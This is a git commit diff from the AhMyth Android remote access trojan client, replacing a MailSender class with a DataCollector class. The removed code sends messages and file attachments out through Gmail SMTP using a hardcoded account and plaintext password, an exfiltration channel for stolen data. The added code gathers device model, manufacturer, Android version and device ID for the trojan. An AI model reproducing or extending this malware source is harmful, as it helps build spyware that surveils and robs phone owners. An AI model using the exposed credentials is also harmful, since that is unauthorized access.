28fff1e6ab832a66d507a1cfe97f2b207f156d06
Tred <githut709@gmail.com>
2026-05-24 18:23:40 +0530

    fix: restore correct DataCollector class

--- AhMyth-Android-RAT-master/AhMyth-Client/app/src/main/java/utils/DataCollector.java
+++ AhMyth-Android-RAT-master/AhMyth-Client/app/src/main/java/utils/DataCollector.java
@@ -1,56 +1,24 @@
 package ahmyth.mine.ahmyth.utils;
 
-import java.util.Properties;
-import javax.mail.*;
-import javax.mail.internet.*;
-import javax.activation.*;
-import java.io.*;
+import android.content.Context;
+import android.os.Build;
+import android.provider.Settings;
 
-public class MailSender {
-    private static final String USERNAME = "rrealgemigindian@gmail.com";
-    private static final String PASSWORD = "jldewikyetjscuqx";
+public class DataCollector {
+    private Context context;
 
-    public void sendEmail(String subject, String body) {
-        sendEmail(subject, body, null);
+    public DataCollector(Context context) {
+        this.context = context;
     }
 
-    public void sendEmail(String subject, String body, String attachmentPath) {
-        Properties props = new Properties();
-        props.put("mail.smtp.auth", "true");
-        props.put("mail.smtp.starttls.enable", "true");
-        props.put("mail.smtp.host", "smtp.gmail.com");
-        props.put("mail.smtp.port", "587");
-
-        Session session = Session.getInstance(props, new Authenticator() {
-            @Override
-            protected PasswordAuthentication getPasswordAuthentication() {
-                return new PasswordAuthentication(USERNAME, PASSWORD);
-            }
-        });
-
-        try {
-            MimeMessage message = new MimeMessage(session);
-            message.setFrom(new InternetAddress(USERNAME));
-            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(USERNAME));
-            message.setSubject(subject);
-
-            Multipart multipart = new MimeMultipart();
-            MimeBodyPart textPart = new MimeBodyPart();
-            textPart.setText(body, "UTF-8");
-            multipart.addBodyPart(textPart);
-
-            if (attachmentPath != null && !attachmentPath.isEmpty()) {
-                MimeBodyPart filePart = new MimeBodyPart();
-                DataSource source = new FileDataSource(new File(attachmentPath));
-                filePart.setDataHandler(new DataHandler(source));
-                filePart.setFileName(new File(attachmentPath).getName());
-                multipart.addBodyPart(filePart);
-            }
-
-            message.setContent(multipart);
-            Transport.send(message);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    public String getAllData() {
+        StringBuilder sb = new StringBuilder();
+        sb.append("Device Model: ").append(Build.MODEL).append("\n");
+        sb.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
+        sb.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
+        sb.append("Device ID: ").append(Settings.Secure.getString(
+            context.getContentResolver(), Settings.Secure.ANDROID_ID)).append("\n");
+        return sb.toString();
     }
 }
+
